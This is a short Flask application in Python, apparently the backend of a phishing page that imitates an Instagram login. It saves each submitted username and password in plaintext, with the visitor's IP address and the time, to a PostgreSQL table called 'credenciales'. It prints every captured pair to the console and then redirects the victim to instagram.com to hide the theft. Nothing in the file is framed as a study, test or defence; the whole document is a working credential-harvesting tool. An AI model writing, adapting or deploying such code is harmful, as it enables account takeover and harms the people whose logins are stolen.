from flask import Flask, request, render_template, redirect
from datetime import datetime
import psycopg2
import os

app = Flask(__name__)


DATABASE_URL = os.environ.get('DATABASE_URL')

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip = request.remote_addr
        time = datetime.now()

        try:
            conn = psycopg2.connect(DATABASE_URL)
            cur = conn.cursor()

            cur.execute("""
                CREATE TABLE IF NOT EXISTS credenciales (
                    id SERIAL PRIMARY KEY,
                    username TEXT,
                    password TEXT,
                    ip TEXT,
                    fecha TIMESTAMP
                )
            """)

            cur.execute("""
                INSERT INTO credenciales (username, password, ip, fecha)
                VALUES (%s, %s, %s, %s)
            """, (username, password, ip, time))

            conn.commit()
            cur.close()
            conn.close()

            print(f"[GUARDADO] {username} - {password} - {ip} - {time}")

        except Exception as e:
            print("[ERROR AL GUARDAR EN BD]", e)

        return redirect("https://www.instagram.com")

    return render_template("form.html")

if __name__ == '__main__':
    app.run()

